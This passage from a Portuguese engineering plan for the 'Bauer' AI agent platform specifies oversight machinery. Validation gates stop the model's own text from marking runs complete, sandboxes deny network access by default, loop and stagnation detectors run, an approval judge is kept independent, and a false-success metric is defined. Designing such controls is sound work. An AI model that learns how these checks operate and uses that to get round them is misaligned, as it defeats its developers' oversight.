stack); security é `binary_scanner.py` + `url_safety.py`.

**Ligação:** `Evaluator(gates=[...])` montado a partir do TaskContract, em vez
dos dois gates default de texto.

**Validação obrigatória** (mantida): aceite, escopo, existência de mudanças,
comandos com erro, segredos no diff, sintaxe/compilação, testes relacionados.
**Configurável** (mantida): lint, mypy, suíte completa, segurança, benchmark,
cobertura, dependências.

**Regra de conclusão** (mantida, com a ressalva de §9.3): a resposta textual da
LLM nunca move o run para `completed`.

**Critérios de aceite:** 100% das tarefas de código executam gates; teste
falhando, mudança fora de escopo ou segredo impedem `completed`; resultado na
auditoria; feedback entra no replan; **e o caminho `admit()` está resolvido
por (a) ou (b) de §9.3.**

---

## 12. S12 — Isolamento, checkpoint e rollback

**Esforço assimétrico, ao contrário do que o original sugere:** worktree está
quase pronto, container é do zero.

**Estrutura revisada:**

```
bauer/core/workspace/
├── manager.py
├── git_worktree.py       # fachada sobre task_worktree.py (existe)
├── sandbox.py            # GREENFIELD — nada disso existe hoje
├── workspace_snapshot.py # renomeado: checkpoint.py já é estado do daemon (§3)
├── cleanup.py
└── limits.py
```

**Níveis** — mantidos do original (0 leitura, 1 worktree, 2 container, 3 humano).

**Correção nas regras.** O original diz: *"Nenhum `bauer run` altera diretamente
a branch principal. Cada run recebe branch própria."* Isso **quebra o fluxo
diário de trabalho** deste projeto, onde fix pequeno vai direto ao master sem
branch nem PR. Revisão:

- o nível de isolamento vem de `TaskContract.isolation`, com default por risco;
- `bauer run` interativo em risco baixo pode continuar no workspace atual;
- run **autônomo** que modifica código: worktree por default;
- **branch própria é obrigatória apenas para execução autônoma não supervisionada**.

Demais regras mantidas: limites de disco e tempo, só variáveis autorizadas no
container, rede negada por default em execução de código, aplicar só após
validação, preservar worktree em falha conforme config.

### 12.3 Restrição que o original ignora: hermeticidade da suíte

Isto já custou caro. O CI foi de 5 min para **2–3.5 h** porque o `config.yaml`
do repo apontava para um provider vivo e os testes faziam HTTP real na compressão
de contexto; corrigido fixando `BAUER_CONFIG`/`BAUER_HOME` em `tests/conftest.py`.
Um teste com `MCP_SERVER_GITMCP` do ambiente vazando já foi diagnosticado errado
como "falha pré-existente". E 23 entradas de teste vazaram para o
`~/.bauer/projects.json` real porque um default era resolvido no import.

S12 introduz **git worktrees e containers** nos testes — exatamente as duas
coisas mais propensas a esse vazamento.

**Regra obrigatória no DoD:** nenhum teste toca o repositório git real nem o
Docker do host. Git via fixture `tmp_path` com repo inicializado; Docker atrás de
runner injetável (o padrão que `app_verify.py` já usa). Considerar também que
**WDAC bloqueia binários e `pytest.exe` no Windows local** — validação de
sandbox precisa rodar no CI ou no Beelink, não na máquina de desenvolvimento.

---

## 13. S13 — Controle de progresso e anti-loop

**Correção maior do documento.** O original propõe criar
`core/progress/{monitor,fingerprint,stagnation,policy}.py`. Já existem **quatro**
implementações funcionando:

| Módulo | O que detecta |
|---|---|
| `agent._detect_loop()` (`agent.py:365`) | repetição **consecutiva** da mesma fingerprint; warn + hard stop |
| `tool_guardrails.py` | 4 padrões **cumulativos**: failure loop exato, falha por tool, no-progress idempotente, hard stop agregado — com thresholds warn/block |
| `tool_dedup.py` | call idêntica **bem-sucedida**: devolve cache com aviso pedagógico; tool mutante limpa o cache |
| `iteration_budget.py` | teto de chamadas de LLM por turno, com refund para tools RPC |

Criar um quinto seria a fragmentação que este plano combate.

Também: o critério *"o agente não consome todas as 120 tools repetindo a mesma
ação"* tem dois erros. São **80 tools** (`ToolRouter.get_tool_schemas()`), e o
caso já está coberto pelos módulos acima.

**O gap real de S13 é outro:** essas quatro camadas vivem no laço de turno do
`agent.py`, **fora do Kernel**, e não aparecem na auditoria nem nas métricas.
Quando um loop é barrado, o run não registra o motivo de forma consultável.

**Escopo revisado de S13:**

1. `core/progress/monitor.py` — **fachada única** sobre os quatro (sem
   reimplementar nenhum).
2. Expor a decisão de estagnação ao Kernel, como sinal de replan.
3. Publicar `run.progress.warning` e a métrica `bauer_repeated_actions_total`.
4. Registrar o motivo de parada na auditoria e permitir retomada com nova
   orientação.
5. Detectar sinais que hoje ninguém cobre: **plano sem mudança entre replans**,
   **alternância entre duas ações** (A→B→A→B, que não é repetição consecutiva),
   **alterações revertidas**, **crescimento de tokens sem progresso**.

Esforço bem menor que o original supõe; o item 5 é o único código novo real.

---

## 14. S14 — Observabilidade, auditoria e avaliação

**Eventos.** 9 dos 17 já existem. Faltam **8**:

```
run.planning.started      run.context.built        run.workspace.created
run.progress.warning      run.validation.started   run.validation.failed
run.replanning            run.workspace.cleaned
```

(`run.policy.checked` já é coberto por `policy.evaluated`.)

**Métricas.** 13 existem (`bauer_runs_total`, `bauer_runs_failed_total`,
`bauer_tool_calls_total`, `bauer_policy_denied_total`,
`bauer_client_disconnects_total`, …). Faltam as **10** que medem harness e não
disponibilidade:

```
bauer_runs_completed_total          bauer_runs_cancelled_total
bauer_runs_stuck_total              bauer_run_duration_seconds
bauer_replans_total                 bauer_validation_failures_total
bauer_context_tokens                bauer_context_compressions_total
bauer_repeated_actions_total        bauer_workspace_cleanup_failures_total
bauer_false_success_total
```

`bauer_false_success_total` é a métrica mais importante do plano e a mais difícil
de definir. Definição operacional proposta: **run que concluiu `completed` e cujo
gate `tests` reprovaria se executado depois** — mensurável rodando os gates em
modo shadow sobre runs já concluídos, sem bloquear.

**Dashboard** — lista do original mantida integralmente.

**Harness Evaluation Suite.** Os 20 cenários do original ficam, com **três
adições** vindas de §9:

21. Cliente native recebe protocolo native (não bridge) — §9.1.
22. Gate de aprovação com juiz igual ao modalidade principal é rejeitado — §9.2.
23. `VAR=x cmd` não compartilha entrada de allowlist com `VAR=x outro` — §9.4.

E uma correção no cenário 11 ("cliente SSE desconecta"): só é válido **após** a
regressão de streaming token a token estar corrigida (§9.3), senão passa vazio.

**Critério de aceite:** ≥23 cenários; relatório comparável entre versões; nenhum
release reduz o score sem justificativa; eventos permitem reconstruir a
trajetória; runs presos detectados; taxa de falso sucesso medida.

---

## 15. Indicadores para declarar 90%

Lista do original mantida, com quatro adições e uma correção de contagem:

```yaml
kernel_coverage: 100%
# REFORMULADO: ">=90%" era inatingível — o teto estrutural é 79%. /stream,
# /v1 streaming e orchestrate --background não podem ceder a posse do run.
kernel_full_custody_coverage: "100% dos caminhos com custódia POSSÍVEL"   # ATENDIDO
task_contract_coverage: 100%
context_builder_coverage: 100%           # <-- UNICO EM ABERTO (S9)
code_task_validation_coverage: 100% dos runs que MUDAM arquivos   # ATENDIDO
code_task_isolation_coverage: "100% das tarefas cujo contrato pede"  # ATENDIDO
cancel_support: 100%
recovery_support: 100%
stuck_run_detection: true
anti_loop_detection: true
runtime_capability_invariant: true       # ADIÇÃO — §9.1
independent_approval_judge: true         # ADIÇÃO — §9.2
policy_parser_property_tests: true       # ADIÇÃO — §9.4
auditable_execution_paths: 100%
harness_eval_scenarios: ">=23"           # ATENDIDO: 23/23
critical_eval_pass_rate: 100%
overall_eval_pass_rate: ">=90%"
false_success_rate: "<2%"                # ATENDIDO: 0.0% medido
orphaned_run_rate: "<1%"                 # ATENDIDO: 0.0% medido
suite_hermetic: true                     # ADIÇÃO — §12.3
```

---

## 16. Ordem de implementação

```
1. S7   Baseline, inventário + runner de evals com 2 cenários
2. S8   RunEntry
3. S8   Migrar CLI, /loop e serve_loop
4. S8   Migrar API e SSE          ← resolver §9.3 aqui, não depois
5. S8   Migrar scheduler (6d), dispatcher, swarm, orchestrator, daemon, app_factory
6. S10  TaskContract
7. S9   ContextBuilder (fachada, reusando context_manager)
8. S11  Gates do Evaluator
9. S12  Worktree por run + workspace_snapshot
10. S12 Sandbox em container
11. S13 ProgressMonitor (fachada) + sinais novos
12. S14 Observabilidade
13. S14 Evaluation Suite completa
14. HARNESS-020  Flip do default + remoção do legado
```

Regras do original mantidas: o Validator antes de aumentar autonomia; o
isolamento antes de múltiplos agentes no mesmo projeto.

**Regra adicionada:** §9.3 é decidido em S8, não em S11. Descobrir na hora de
escrever os gates que o `/stream` não tem custódia é descobrir tarde.

---

## 17. Backlog

### P0 — obrigatório para 90%

Os 20 itens do original, com escopos corrigidos:

| ID | Item | Correção |
|---|---|---|
| HARNESS-001 | Mapear caminhos de execução | + campo `kernel_custody` |
| HARNESS-002 | Criar `RunEntry` | renomeado (colisão com `gateway.py`) |
| HARNESS-003 | Ativar Kernel por default | **movido para depois do 020** |
| HARNESS-004 | Migrar CLI e `/loop` | `/loop` **é** `bauer run` — um item, não dois; + `serve_loop.py` |
| HARNESS-005 | Migrar API e SSE | inclui decidir §9.3 |
| HARNESS-006 | Migrar scheduler e worker | é a Sprint 6d pendente |
| **HARNESS-006b** | **Migrar swarm, orchestrator, execution_engine, daemon, app_factory** | **novo — 5 caminhos que o original omitia** |
| HARNESS-007 | Criar TaskContract | + `timeout_seconds`, `selection`, `isolation` |
| HARNESS-008 | Planner real | **reduzido** — `autonomous_planner` existe; só persistir aceite |
| HARNESS-009 | ContextBuilder | **fachada** sobre `context_manager`; não reescrever compressor |
| HARNESS-010 | Orçamento de tokens | + `requested_context: auto` |
| HARNESS-011 | Proveniência do contexto | o gap real de S9 |
| HARNESS-012 | Validation Pipeline | **cancelado** — usar `Evaluator` |
| HARNESS-013 | Scope Validator | **adaptar** `scope_boundary.py` |
| HARNESS-014 | Tests Validator | **adaptar** `app_verify.py` |
| HARNESS-015 | Secrets Validator | **adaptar** `secrets_scanner.py` |
| HARNESS-016 | Worktree por run | **ligar** `task_worktree.py`; contrato decide o nível |
| HARNESS-017 | Checkpoint e rollback | renomear p/ `workspace_snapshot` |
| HARNESS-018 | Detector de estagnação | **fachada** sobre 4 módulos + 4 sinais novos |
| HARNESS-019 | Suíte de avaliações | runner antecipado p/ S7 |
| HARNESS-020 | Remover bypass legado | + flip do default do Kernel |
| **HARNESS-029** | **Invariante de capacidade do runtime** | **novo — §9.1** |
| **HARNESS-030** | **Juiz de aprovação independente** | **novo — §9.2** |
| **HARNESS-031** | **Validação no caminho `admit()`** | **novo — §9.3, bloqueante** |
| **HARNESS-032** | **Property tests do parser de policy** | **novo — §9.4** |
| **HARNESS-033** | **Corrigir streaming token a token no native** | **novo — pré-requisito do cenário 11** |

### P1 — necessário para maturidade

Os 8 do original (sandbox em container, limites de CPU/memória/disco, dashboards
de contexto e validação, limpeza de órfãos, métricas Prometheus, export
OpenTelemetry, relatório de score por release), mais:

- **HARNESS-034:** roteamento por capacidade quando o gate nega por incapacidade
  do runtime, em vez de escalar para humano (§9.2).

### P2 — depois dos 90%

Inalterado: execução distribuída, múltiplos workers, sandbox remoto, replay
completo, shadow execution, testes de caos, comparação automática entre modelos,
aprendizado com resultados dos Validators, otimização automática de prompt.

---

## 18. Estratégia de entrega

Formato do original mantido (PR pequeno por item), com a ordem de §16 e o
runner de evals no PR 1. Regra do original preservada e reforçada: **evitar uma
alteração grande que substitua Kernel, contexto, validação e workspace ao mesmo
tempo.**

---

## 19. Definition of Done

Os 10 itens do original, mais dois de §12.3:

1. Testes unitários.
2. Teste de integração.
3. Gera eventos de auditoria.
4. Configuração documentada.
5. Falha de maneira segura.
6. Suporta cancelamento.
7. Não cria bypass do Kernel.
8. Comportamento definido após reinício.
9. Tem métrica ou indicador.
10. Aparece em ≥1 cenário da Evaluation Suite. *(viável porque o runner nasce em S7)*
11. **Nenhum teste toca o git real, o Docker do host ou a rede.**
12. **Se muda estado global (registry, config, paths), o default é resolvido em
    tempo de chamada, não no import.** *(o vazamento de 23 entradas no
    `projects.json` real veio de um `Path.home()` avaliado no import)*

---

## 20. Riscos

| Risco | Mitigação |
|---|---|
| Segundo mecanismo de gate em paralelo ao `Evaluator` | S11 escreve gates, não pipeline (§11) |
| Reescrita do compressor de contexto perde anti-thrashing e fallback | `builder.py` delega a `context_manager` (§8) |
| Colisão de nomes (`gateway`, `checkpoint`, `execution_engine`) | renomeados em §3 |
| Flip do default com 9 caminhos fora do Kernel | flip vai para HARNESS-020 (§7) |
| Validator inviabiliza o loop autônomo por tempo de execução | `timeout_seconds` + `selection: related` no contrato (§10) |
| Worktree obrigatório quebra o fluxo diário de fix direto no master | nível vem do contrato, por risco (§12) |
| Testes de sandbox quebram a hermeticidade | DoD 11 e 12 (§12.3, §19) |
| Cenário SSE passa vazio | HARNESS-033 antes de S14 (§9.3) |
| Percentuais aditivos criam falsa precisão | pesos relativos; o que declara 90% é §15 |

---

## 21. Resultado esperado

Inalterado do original:

```
Solicitação → contrato estruturado → planejamento verificável →
contexto mínimo e rastreável → política e orçamento → ambiente isolado →
execução monitorada → validação determinística → replanejamento ou conclusão →
auditoria completa
```

O Bauer deixa de ser um agente com muitas ferramentas e passa a ser uma
plataforma governada de execução de agentes.
